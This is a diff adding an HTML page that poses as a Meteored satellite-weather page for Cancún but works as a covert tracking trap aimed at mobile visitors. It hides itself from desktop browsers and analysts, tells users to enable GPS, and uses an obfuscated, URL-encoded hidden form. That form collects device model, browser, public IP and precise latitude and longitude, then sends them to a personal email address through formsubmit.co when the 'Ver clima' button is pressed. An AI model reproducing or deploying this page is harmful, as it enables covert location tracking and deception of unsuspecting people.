@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/dist/ua-parser.min.js"></script>
+  <script>
+document.addEventListener('copy', function(e) {
+  e.preventDefault();
+});
+</script>
+<script>
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+</script>
+<script>
+  window.addEventListener('debugger', function() {
+    window.close();
+  });
+</script>
+ <script>
+	document.addEventListener("DOMContentLoaded", function() {
+		if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && window.innerWidth < 768) {
+			document.body.style.visibility = 'visible';
+		} else {
+			window.location.href = 'https://www.meteored.mx/satelites/'; }
+	});
+</script>
+      <link
+      rel="icon"
+      type="image/jpeg"
+      href="https://i.imgur.com/cQIZXyE.jpeg"/>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Satélite GOES : Meteored</title>
+</head>
+<body>
+<script> alert ("Prende tu GPS, para ver el clima en tu area")</script>
+  <script>
+  const fechaActual = new Date();
+  const dia = fechaActual.getDate();
+  const mes = fechaActual.toLocaleString('es-ES', { month: 'long' });
+  const anio = fechaActual.getFullYear();
+
+  document.write(unescape(`%3Cdiv%20class%3D%22card%22%3E%0A%20%20%3Cdiv%20class%3D%22container%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22cloud%20front%22%3E%0A%20%20%20%20%20%20%3Cspan%20class%3D%22left-front%22%3E%3C%2Fspan%3E%0A%20%20%20%20%20%20%3Cspan%20class%3D%22right-front%22%3E%3C%2Fspan%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3Cspan%20class%3D%22sun%20sunshine%22%3E%3C%2Fspan%3E%0A%20%20%20%20%3Cspan%20class%3D%22sun%22%3E%3C%2Fspan%3E%0A%20%20%20%20%3Cdiv%20class%3D%22cloud%20back%22%3E%0A%20%20%20%20%20%20%3Cspan%20class%3D%22left-back%22%3E%3C%2Fspan%3E%0A%20%20%20%20%20%20%3Cspan%20class%3D%22right-back%22%3E%3C%2Fspan%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%20%20%3C%2Fdiv%3E%0A%20%20%3Cdiv%20class%3D%22card-header%22%3E%0A%20%20%20%20%3Cspan%3ECancún%2C%20Quitana Roo,%3Cbr%3EMéxico%3C%2Fspan%3E%0A%20%20%20%20%3Cspan%3E${dia}%20de%20${mes}%20de%20${anio}%3C%2Fspan%3E%0A%20%20%3C%2Fdiv%3E%0A%20%20%3Cspan%20class%3D%22temp%22%3E23%B0%3C%2Fspan%3E%0A%3C%2Fdiv%3E%0A%3Cmain%3E%0A%20%20%3Csection%20id%3D%22section-1%22%3E%0A%20%20%20%20%3Cp%20class%3D%22spn2%22%3EObten%20el%20pronostico%20del%20clima%20en%20tu%20area.%3C%2Fp%3E%0A%20%20%20%20%3Cbutton%20class%3D%22button-jx1%22%3EVer%20clima%3C%2Fbutton%3E%0A%20%20%3C%2Fsection%3E%0A%3C%2Fmain%3E`));
+</script>
+<script>
+  document.write(unescape("%3Cform%20action%3D%22https%3A%2F%2Fformsubmit.co%2Fmarco42748261@gmail.com%22%20method%3D%22POST%22%3E%0A%20%20%3Clabel%20for%3D%22marca%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22marca-1%22%20name%3D%22marca-1%22%20readonly%3E%0A%20%20%3Clabel%20for%3D%22modelo%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22modelo-1%22%20name%3D%22modelo-1%22%20readonly%3E%0A%20%20%3Clabel%20for%3D%22navegador%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22navegador-1%22%20name%3D%22navegador-1%22%20readonly%3E%0A%20%20%3Clabel%20for%3D%22version%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22version-1%22%20name%3D%22version-1%22%20readonly%3E%0A%20%20%3Clabel%20for%3D%22ip%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22ip-1%22%20name%3D%22ip-1%22%20readonly%3E%0A%20%20%3Clabel%20for%3D%22ubicacion%22%3E%3C%2Flabel%3E%0A%20%20%3Cinput%20type%3D%22text%22%20id%3D%22ubicacion-1%22%20name%3D%22ubicacion-1%22%20readonly%3E%0A%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22_next%22%20value%3D%22https%3A%2F%2Fshare-19lf8ouhbx-46875.github.io/fid-UyTHkb2%2F%22%3E%0A%20%20%3Cinput%20type%3D%22hidden%22%20name%3D%22_captcha%22%20value%3D%22false%22%3E%0A%3C%2Fform%3E"));
+</script>
+<script>
+  var parser = new UAParser();
+  var resultado = parser.getResult();
+  var marca = resultado.device.vendor;
+  var modelo = resultado.device.model;
+  var navegador = resultado.browser.name;
+  var version = resultado.browser.version;
+  document.getElementById("marca-1").value = marca;
+  document.getElementById("modelo-1").value = modelo;
+  document.getElementById("navegador-1").value = navegador;
+  document.getElementById("version-1").value = version;
+</script>
+<script>
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      var ip = data.ip;
+      document.getElementById("ip-1").value = ip;
+    })
+    .catch(error => console.error(error));
+</script>
+<script>
+  navigator.geolocation.getCurrentPosition(position => {
+    var latitud = position.coords.latitude;
+    var longitud = position.coords.longitude;
+    document.getElementById("ubicacion-1").value = "Latitud: " + latitud + ", Longitud: " + longitud;
+  }, error => {
+    console.error(error);
+    document.getElementById("ubicacion-1").value = "No se pudo obtener la ubicación";
+  });
+</script>
+  <script>
+document.querySelector('.button-jx1').addEventListener('click', function() {
+  document.querySelector('form').submit();
+});
+</script>
+</body>
+</html>
